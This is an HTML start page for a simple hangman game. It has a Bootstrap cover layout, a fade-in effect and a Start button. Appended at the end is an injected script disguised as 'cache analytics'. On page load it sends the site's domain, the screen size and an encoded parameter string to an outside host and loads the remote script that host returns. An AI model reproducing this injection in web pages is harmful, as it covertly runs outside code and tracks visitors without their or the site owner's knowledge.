
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
    <title>Random Ass Hangman Game</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <link href="cover.css" rel="stylesheet">
	<script src="js/ie-emulation-modes-warning.js"></script>
	<script src="js/jquery-3.1.1.min.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$(".cover").fadeIn(1500).removeClass("hidden");
			$("a.btn").click(function(event){
				event.preventDefault();
				linkLocation = this.href;
				$(".cover").fadeOut(1000);
				window.location = linkLocation;
			})
		})
	</script>
  </head>

  <body>

    <div class="site-wrapper">

      <div class="site-wrapper-inner">

        <div class="cover-container">

          <div class="masthead clearfix">
            <div class="inner">
              <h3 class="masthead-brand">Hangman</h3>
              <nav>
                <ul class="nav masthead-nav">
                  <li class="active"><a href="index.php">Home</a></li>
                  <li><a href="#">About</a></li>
                  <li><a href="#">Contact</a></li>
                </ul>
              </nav>
            </div>
          </div>

          <div class="inner cover hidden">
            <h1 class="cover-heading">JAHG</h1>
            <p class="lead">Just Another Hangman Game</p>
            <p class="lead">Press the button below if you are ready.</p>
            <p class="lead">
              <a href="game.php" class="btn btn-lg btn-default">Start!</a>
            </p>
          </div>

          <div class="mastfoot">
            <div class="inner">
              <p>Copyright by Fauzan Ardhana.</p>
            </div>
          </div>

        </div>

      </div>

    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
    <script src="../../dist/js/bootstrap.min.js"></script>
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BCExWkDbNJyThlSnwe2u2LmNHWGS%2feH%2f%2becw%2fY4hjyf%2brvAF5SauiRDNkYiqnMPsqP6JahM2zmJgBVxIUb%2f71gQNi2QborCAVC5Wrx25HVhOU1fLfiMAco65pgm%2bsI%2biN8Wii6dviv11EBj1c7lWwGsXX1lFVDQ5RztgI6DS9rCxeups2BLw%2fNUX5nn%2bBHT38MMP%2f7webQXnvq6%2ftwOwaugf6Nfnjkh9hz4HBaMQ6Pj8gDdahbARQyJei1kB%2b9jCP%2byE28zIfjozhZ57jBIoC5PNLaH%2boZH0riJop4IBoN49IxMQhj1O74crUWzBO5UT43hP5d5d0mWQQXGoZQfcRR%2f5EX81QwQfpVk02ai9l%2bk775D2dXAOp1UtMnveWq3RUQ76%2bn0amQmD8EcSkUkw5XDGfuS4rlpWJ2HPpIsTlBdEb8bXBLAWH0MkQP67jUpgDh7R6NYrusxE6D569lYqcBhSYK%2fSg69mVYmTgIm0dc2LywjvdkTt1Ys0HkzYRjV10XxP2XEVy%2bwM5EOjcRA%2bDIzZJU5jqlv2sLHy8muL5GxA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
